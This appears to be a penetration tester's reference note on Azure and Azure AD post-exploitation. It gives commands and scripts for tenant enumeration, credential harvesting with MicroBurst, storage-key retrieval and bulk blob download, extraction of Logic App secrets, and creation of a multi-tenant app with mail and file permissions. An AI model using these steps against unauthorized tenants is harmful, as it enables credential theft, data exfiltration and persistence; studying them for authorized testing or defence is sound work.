# Azure

### Subscription-wide authenticated enumeration

###### ScoutSuite

[`ScoutSuite`](https://github.com/nccgroup/ScoutSuite) is a multi-cloud
Python audit tool that produce an `HTML` report based on a subscription-wide
enumeration and a number of configuration and security checks.

`ScoutSuite` notably includes enumeration / checks on:
  - Azure AD users, groups, service principals, and applications
  - Azure RBAC roles (details, associated permissions and users)
  - Various services, such as VMs, Databases, Key vaults, or Storage Accounts
  - Security configurations, on logging / monitoring or Security Center options
  - ...

```bash
virtualenv -p python3 venv
source venv/bin/activate
pip install scoutsuite

scout azure --tenant <TENANT> [--user-account-browser | --user-account]
```

### Manual Azure / AAD enumeration

The `AzureAD` and `Az` modules can be used to conduct authenticated enumeration
of an AAD tenant and / or Azure subscription.

```bash
# AzureAD module authentication.
Connect-AzureAD

# -- Pass-the-PRT-cookie.
Connect-AzureAD -TenantId "<AAD_TENANT_ID>" -AccountId "<ACCOUNT_ID>" -AadAccessToken "<ACCESS_TOKEN>"

# -- AzureRT's Connect-ARTAD for Azure AD access.
Connect-ARTAD -Username <String> -Password <String>
Connect-ARTAD -Credential <PSCredential>
Connect-ARTAD [-AccessToken <String>] [-TokenFromAzCli]

# Az module authentication.
Connect-AzAccount

# -- AzureRT's Connect-ART for Azure access.
Connect-ART -Username <String> -Password <String> [-ServicePrincipal] [-TenantId <String>]
Connect-ART -Credential <PSCredential>
Connect-ART [-AccessToken <String>] [-GraphAccessToken <String>] [-KeyVaultAccessToken <String>] [-SubscriptionId <String>] [-TokenFromAzCli]

# Azure CLI.
az login [--service-principal] [--tenant <TENANT_ID>] --username <USERNAME> --password <PASSWORD>
az login [--tenant <TENANT_ID>] --use-device-code
# Uses a VM's system assigned identity.
az login --identity
```

| Description | `AzureAD` module | `Az` module | `az cli` | `AzureRT` module |
|-------------|------------------|-------------|----------|------------------|
| Tenant | `Get-AzureADTenantDetail` | `Get-AzTenant` |
| Current session | `Get-AzureADCurrentSessionInfo` | `Get-AzContext` | `az ad signed-in-user show` | `Get-ARTWhoami` |
| Users | `Get-AzureADUser` | `Get-AzADUser` |
| User's memberships | `Get-AzureADUserMembership -All $True -ObjectId "<USER_ID>"` |
| User's owned registered devices | `Get-AzureADUserOwnedDevice -ObjectId "<USER_ID>"` |
| User's owned objects | `Get-AzureADUserOwnedObject -All $True -ObjectId "<USER_ID>"` |
| Applications | `Get-AzureADApplication` | `Get-AzureADApplication` | |
| Devices | `Get-AzureADDevice` |
| Service Principals | `Get-AzureADServicePrincipal` |
| AAD Roles | `Get-AzureADDirectoryRole` |
| AAD Roles associated members | `Get-AzureADDirectoryRoleMember -ObjectId "<ROLE_ID>"` |
| Groups | `Get-AzureADGroup` | `Get-AzADGroup` |
| Group's members | `Get-AzureADGroupMember -ObjectId "<GROUP_ID>"` | `Get-AzADGroupMember -GroupObjectId  "<GROUP_ID>"` |
| Group's owner | `Get-AzureADGroupOwner -ObjectId "<GROUP_ID>"`
| Azure resources accessible by the current user | | `Get-AzResource` | Only owned ressources: <br> `az ad signed-in-user list-owned-objects` | `Get-ARTAccess` |
| Azure RBAC roles (all or for the given object) | | `Get-AzRoleAssignment [-ObjectId <OBJECT_ID>]` | `az role assignment list --all` | |
| Azure AD objects accessible by the current user | | | |  `Get-ARTADAccess` |
| Azure Virtual Machine | | `Get-AzVM` | `az vm list` |
| Azure App Services / Azure WebApp | | `Get-AzWebApp` | `az webapp list` |
| Azure WebApp - Get details on an Azure WebApp | | | `az webapp show --resource-group "<RESSOURCEGROUP>" --name "<NAME>"` | |
| Azure WebApp - Get the eventual connection string(s) configured for a Azure WebApp | | | `az webapp config connection-string list --resource-group "<RESSOURCEGROUP>" --name "<NAME>"` | |
| Azure WebApp - Get the eventual deployment credentials for a Azure WebApp | | | `az webapp deployment list-publishing-credentials --resource-group "<RESSOURCEGROUP>" --name "<NAME>"` | |
| Azure Storage | | `Get-AzStorageAccount` | `az storage account list` |
| Azure Storage - Get Azure Storage's Container | | `Get-AzRmStorageContainer -StorageAccountName "<STORAGE_ACCOUNT_NAME>" -ResourceGroupName "<STORAGE_ACCOUNT_RESSOURCEGROUP>"` | |
| Azure Storage - Get Azure Storage's Shares | | `Get-AzRmStorageShare -StorageAccountName "<STORAGE_ACCOUNT_NAME>" -ResourceGroupName "<STORAGE_ACCOUNT_RESSOURCEGROUP>"` | |
| Azure KeyVault | | `Get-AzKeyVault` | `az keyvault list` |
| Azure Container Registry | | List repositories in a given `Azure Container Registry`: <br> `Get-AzContainerRegistryRepository -RegistryName "<REGISTRY_NAME>"` <br><br>  | List repositories in a given `Azure Container Registry`: <br> `az acr repository list --name "<REGISTRY_NAME>" --output table` <br><br> Get the attributes of a repository or image: <br> `az acr repository show --name "<REGISTRY_NAME>" [--image "<IMAGE_NAME>" \| --repository "<REPOSITORY_NAME>"` <br><br> Get the credentials for a given `Azure Container Registry`: `az acr credential show --name "<REPOSITORY_NAME>"` |

### Credentials retrieval

###### Automated subscription-wide credentials retrieval with MicroBurst's Get-AzPasswords

[`Get-AzPasswords`] is a PowerShell cmdlet, part of the `MicroBurst` module,
attempts to retrieves credentials from a number of Azure services (depending on
the current user privileges), including:
  - Key Vaults
  - App Services Configurations
  - Automation Accounts

```bash
Import-Module .\MicroBurst.psm1

Login-AzAccount

Get-AzPasswords -Verbose
```

###### Primary Refresh Token post-exploitation on Azure-joined systems

Refer to the `[Windows] Post exploitation - Credentials dumping` note
(`Primary Refresh Token for Azure-joined devices` section) for more information
on how to retrieve and use a `PRT` from a compromised Azure AD joined or
hybrid-joined device.

### Storage Accounts

In order to list the files in a `Storage Account` `Container` or `Share`, a
authenticated context for the given `Storage Account` must be created.

```bash
Import-Module Az

$azStorageAccountName = "<STORAGE_ACCOUNT_NAME>"
$azResourceGroupName = "<STORAGE_ACCOUNT_RESSOURCEGROUP>"

# Setup the AZURE_STORAGE_CONNECTION_STRING environment variable for access to Container blob or Share files if required.
# Whether only HTTPS access is allowed can be determine with: Get-AzStorageAccount -ResourceGroupName $azResourceGroupName -Name $azStorageAccountName
# $azStorageAccountKey = "<STORAGE_ACCOUNT_B64_KEY>"
$azStorageAccountKey = $(Get-AzStorageAccountKey -ResourceGroupName $azResourceGroupName -Name $azStorageAccountName)[0].Value
$env:AZURE_STORAGE_CONNECTION_STRING = "DefaultEndpointsProtocol=<http | https>;AccountName=$azStorageAccountName;AccountKey=$azStorageAccountKey"

# Creates the authenticated context for the given Storage Account.
$connectionContext = (Get-AzStorageAccount -ResourceGroupName $azResourceGroupName -AccountName $azStorageAccountName).Context

# Lists the containers in the Storage Account.
Get-AzStorageContainer -Context $connectionContext
Get-AzRmStorageContainer -StorageAccountName $azStorageAccountName -ResourceGroupName "<STORAGE_ACCOUNT_RESSOURCEGROUP>"

# Lists the Blobs in a Container.
Get-AzStorageBlob -Context $connectionContext -Container <CONTAINER_NAME> | Select Name

# Lists the Shares in the Storage Account.
Get-AzStorageShare -Context $connectionContext

# Lists the files and directories in the specified share. The AZURE_STORAGE_CONNECTION_STRING connection string can be required.
Get-AZStorageFile -Context $ctx -ShareName "<SHARE_NAME>" | Get-AzStorageFile

# Download the specified file from the share.
Get-AzureStorageFileContent –Share "<SHARE_NAME>" –Path <REMOTE_FILE_PATH> -Destination <LOCAL_DESTINATION_PATH> -PreserveSMBAttribute

Get-AZStorageFile -Context $ctx -ShareName "<SHARE_NAME>" | Get-AzStorageFile | Get-AzStorageFileContent
```

###### Azure Storage Explorer

`Azure Storage Explorer` can be used to browse, upload, and download data
from Azure data storage services. Connections can be established at different
levels (Subscription, `Storage Account`, `Blob Container`, `File share`,
`Queue`, etc.) and with various credential types (account name & key,
connection string, shared access signature URL, etc.).

###### Blob download using Python

The following `Python` script can be used to download all the `Blob` from
`Azure blob containers`:

```python
from azure.storage.blob import BlobServiceClient

sas_token  = '<SAS_TOKEN>'

# Instantiates a BlobServiceClient using a connection string.
blob_service_client = BlobServiceClient.from_connection_string(conn_str=sas_token)

for container in blob_service_client.list_containers():
    print(f"Container: {container['name']}")

    # Instantiates a ContainerClient.
    container_client = blob_service_client.get_container_client(container['name'])

    # Lists the blobs in the container.
    blobs_list = container_client.list_blobs()
    for blob in blobs_list:
        print(f"Blob: {blob['name']}")

        # Instantiates a BlobClient.
        blob_client = container_client.get_blob_client(blob['name'])

        download_blob_path = f"{container['name']}-{blob['name'].replace('/', '__')}"
        print(f"-- Downloading Blob: {blob['name']} as {download_blob_path}")
        with open(download_blob_path, "wb+") as blob_download:
            download_stream = blob_client.download_blob()
            blob_download.write(download_stream.readall())
```

### Virtual Machine

###### Managed identity metadata retrieval

Information about a Virtual Machine instance can be retrieved by quering the
`Azure Instance Metadata Service` on a non-routable IP address from within the
running Virtual Machine instance.

```bash
curl -H Metadata:true "http://169.254.169.254/metadata/instance?api-version=2021-12-13"

Invoke-RestMethod -Headers @{"Metadata"="true"} -Method GET -NoProxy -Uri "http://169.254.169.254/metadata/instance?api-version=2021-12-13" | ConvertTo-Json -Depth 64
```

### Logic App

Source(s):

https://www.netspi.com/blog/technical/cloud-penetration-testing/illogical-apps-exploring-exploiting-azure-logic-apps/

###### Reader

As `Logic App` can take user specific inputs / arguments, credentials may be
retrievable with the `Logic App Operator` or `Reader` permissions.

The following PowerShell script, based on the `Az` module, can be used to
enumerate the `Logic Apps` the authenticated user has access to and retrieve
the inputs to actions or parameters provided to each `Logic App`.

```
$allLogicApps = Get-AzLogicApp

foreach($app in $allLogicApps){
    Write-Host "App name:" $app.Name.ToString()

    $actions = ($app.Definition.ToString() | ConvertFrom-Json | select actions).actions

    $noteProperties = Get-Member -InputObject $actions | Where-Object { $_.MemberType -eq "NoteProperty" }
    foreach($note in $noteProperties){
        Write-Host "Note name:" $note.Name
        Write-Host "Note raw:" $note
        $inputs = ($app.Definition.ToString() | ConvertFrom-Json | Select actions).actions.$noteName.inputs
        Write-Host "Note inputs:" $inputs
    }

    Write-Host "Note parameters:" $app.Definition.parameters
}
```

###### Contributor

`Contributor` permissions on `Logic App` can, in addition to allow eventual
secrets retrieval, be used to modify and run the `Logic App`, effectively
assuming the rights granted to the `Logic App`. For instance, a
system or user `managed identity` or `API Connections` can be associated with a
given `Logic App` to allow authenticated access to other cloud services.

The `Logic App` content can be accessed, modified, and run under
`Logic app designer` (`/designer`) under `Development Tools`.

Note that restrictions can be configured on calls to trigger a given
`Logic App`. For instance, triggers or calls to get input and output messages
from a `Logic App` can be limited to whitelisted `IP` ranges. These
restrictions are configured under `Settings->Workflow settings`
(`/workflowSettings`) and be modified with `Contributor` permissions.

### AzureAD Applications

```
$appName = "<APPLICATION_NAME>"
$appRedirectURL = "https://<REDIRECT_URL>"

# Creates the app.
$app = New-AzureADApplication -DisplayName "$appName" -AvailableToOtherTenants $True -Oauth2AllowImplicitFlow $True -ReplyUrls "$appRedirectURL"
$appPasswordCredential = New-AzureADApplicationPasswordCredential -ObjectId $app.ObjectId -CustomKeyIdentifier "Access Key" -EndDate (get-date).AddYears(5)
$spForApp = New-AzureADServicePrincipal -AppId $app.AppId -PasswordCredentials @($appPasswordCredential)

Write-Host "New application: Name = $($app.DisplayName) | ObjectId = $($app.ObjectId) | AppId = $($app.AppId) | ServicePrincipal = $($spForApp) | Password credential: $($appPasswordCredential.Value)"

# Optional - Adds the required permissions for the app.

# Permissions required for the app.
$appPermissionsTargetServicePrincipalName = 'Microsoft Graph'
$appPermissionsRequired = @("Contacts.Read", "Mail.Read", "Mail.Send", "Notes.Read.All", "Mailboxsettings.ReadWrite", "Files.ReadWrite.All", "User.ReadBasic.All")

$targetSp = Get-AzureADServicePrincipal -Filter "DisplayName eq '$($appPermissionsTargetServicePrincipalName)'"
$RoleAssignments = @()
Foreach ($AppPermission in $appPermissionsRequired) {
    $RoleAssignment = $targetSp.AppRoles | Where-Object { $_.Value -eq $AppPermission}
    $RoleAssignments += $RoleAssignment
}
$ResourceAccessObjects = New-Object 'System.Collections.Generic.List[Microsoft.Open.AzureAD.Model.ResourceAccess]'
foreach ($RoleAssignment in $RoleAssignments) {
    $resourceAccess = New-Object -TypeName "Microsoft.Open.AzureAD.Model.ResourceAccess"
    $resourceAccess.Id = $RoleAssignment.Id
    $resourceAccess.Type = 'Role'
    $ResourceAccessObjects.Add($resourceAccess)
}
$requiredResourceAccess = New-Object -TypeName "Microsoft.Open.AzureAD.Model.RequiredResourceAccess"
$requiredResourceAccess.ResourceAppId = $targetSp.AppId
$requiredResourceAccess.ResourceAccess = $ResourceAccessObjects

Set-AzureADApplication -ObjectId $app.ObjectId -RequiredResourceAccess $requiredResourceAccess

Write-Host "App required permissions: "

$(Get-AzureADApplication -ObjectId $app.ObjectId).requiredResourceAccess | Select-Object -ExpandProperty ResourceAccess
```

--------------------------------------------------------------------------------

### References

https://www.xmcyber.com/blog/privilege-escalation-and-lateral-movement-on-azure-part-1/
